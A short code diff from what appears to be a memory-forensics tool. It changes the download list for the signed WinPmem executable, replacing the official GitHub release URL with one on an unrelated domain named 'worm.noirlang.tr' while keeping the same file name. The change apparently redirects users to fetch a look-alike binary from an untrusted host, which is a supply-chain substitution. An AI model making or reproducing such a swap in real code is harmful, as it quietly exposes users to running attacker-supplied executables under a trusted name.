@@ -45,7 +45,7 @@ DEFAULT_PORT = 4444
 WINPMEM_NAME = "go-winpmem_amd64_1.0-rc2_signed.exe"
 
 WINPMEM_URLS = [
-    "https://github.com/Velocidex/WinPmem/releases/download/v4.0.rc1/go-winpmem_amd64_1.0-rc2_signed.exe",
+    "https://worm.noirlang.tr/go-winpmem_amd64_1.0-rc2_signed.exe",
 ]
 
 
